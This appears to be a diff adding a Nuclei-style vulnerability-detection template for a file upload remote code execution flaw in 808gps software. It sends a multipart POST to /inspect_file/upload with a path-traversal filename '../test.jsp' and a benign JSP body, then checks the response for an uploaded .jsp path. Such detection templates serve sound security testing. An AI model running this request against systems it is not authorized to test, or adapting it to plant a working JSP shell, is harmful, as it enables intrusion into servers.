@@ -1,0 +1,47 @@
+id: jsp-file-upload-rce
+
+info:
+  name: 808gps file upload RCE Vulnerability
+  author: ChiragArtani
+  severity: critical
+  description: Detects a file upload vulnerability that allows uploading JSP files, which could lead to remote code execution.
+  tags: rce,upload,jsp
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/inspect_file/upload"
+    headers:
+      User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+      Accept-Encoding: gzip, deflate
+      Accept: "*/*"
+      Connection: close
+      Content-Type: multipart/form-data; boundary=--2e7688d712bcc913201f327059f9976b
+    body: |-
+      ----2e7688d712bcc913201f327059f9976b
+      Content-Disposition: form-data; name="uploadFile"; filename="../test.jsp"
+      Content-Type: application/octet-stream
+
+      <% out.println("test"); %>
+      ----2e7688d712bcc913201f327059f9976b--
+
+    extractors:
+      - type: regex
+        name: uploaded_jsp
+        part: body
+        regex:
+          - "filePath\":\"([^\"]+\\.jsp)\""
+        group: 1
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "filePath"
+          - ".jsp"
+        condition: and
+        part: body
